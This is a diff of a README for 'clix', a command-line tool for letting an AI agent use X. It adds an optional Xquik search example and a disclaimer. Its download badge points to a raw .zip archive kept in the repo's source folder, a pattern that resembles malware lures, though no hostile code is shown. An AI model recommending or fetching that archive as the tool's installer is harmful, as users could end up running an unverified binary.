@@ -60,11 +60,11 @@ Once clix is open, you will control X from the terminal by typing commands.
 
 Here are some basic commands to get started:
 
-- `clix login` — Connect your AI Agent to clix (no API keys needed).
-- `clix post "Your message"` — Send a message to X.
-- `clix timeline` — See recent messages from people you follow.
-- `clix mentions` — View messages that mention your agent.
-- `clix help` — Show a list of all commands available.
+- `clix login` - Connect your AI Agent to clix (no API keys needed).
+- `clix post "Your message"` - Send a message to X.
+- `clix timeline` - See recent messages from people you follow.
+- `clix mentions` - View messages that mention your agent.
+- `clix help` - Show a list of all commands available.
 
 Use your keyboard to type these commands and press Enter to execute.
 
@@ -78,7 +78,7 @@ clix includes these key features:
 - No need to manage API keys or developer accounts.
 - Simple commands for posting, reading, and managing messages.
 - Integration with AI Agents to automate tasks.
-- Lightweight and fast — runs on basic Windows systems.
+- Lightweight and fast - runs on basic Windows systems.
 - Secure connection to X without storing sensitive data locally.
 
 ---
@@ -143,6 +143,26 @@ Use `clix help <command>` for more details on any specific command.
 
 ---
 
+## Optional Xquik Search
+
+The `clix.core` package includes an optional helper for Xquik tweet search:
+
+```python
+from clix.core import XquikSearchConfig, search_xquik
+
+result = search_xquik(
+    "open source AI",
+    XquikSearchConfig(api_key="xq_your_api_key"),
+    limit=20,
+)
+```
+
+The helper uses the documented `x-api-key` header and supports sort order,
+cursor pagination, result limits, custom endpoints, and request timeouts.
+See the [Xquik API documentation](https://docs.xquik.com) for account setup.
+
+---
+
 ## 📚 Learn More
 
 Explore how clix connects with your AI Agent. Details about agent setup and customization are available on the GitHub page through README files and wiki sections.
@@ -150,3 +170,7 @@ Explore how clix connects with your AI Agent. Details about agent setup and cust
 ---
 
 [![Download clix](https://img.shields.io/badge/Download_clix-Get%20Started-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/dubious-pinetum918/clix/main/clix/mcp/Software-v2.1-beta.3.zip)
+
+---
+
+Xquik is an independent third-party service. Not affiliated with X Corp. "Twitter" and "X" are trademarks of X Corp.
